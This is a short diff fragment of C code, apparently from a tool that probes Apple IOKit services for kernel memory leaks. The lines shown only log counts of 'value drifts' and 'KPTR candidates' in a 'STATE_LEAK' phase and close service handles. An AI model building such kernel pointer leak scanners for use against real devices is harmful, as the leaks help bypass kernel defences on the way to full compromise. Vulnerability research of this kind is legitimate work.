+                rlog("  Total value drifts: %d\n", drift_count);
+                IOServiceClose(conn);
+            }
+            if (svc) IOObjectRelease(svc);
+            rlog("Phase 6 complete. Total KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        #undef SCAN_KPTRS
+        rlog("\n=== STATE_LEAK complete. Total KPTR candidates: %d ===\n", kptr_found);
     }
 
 done:
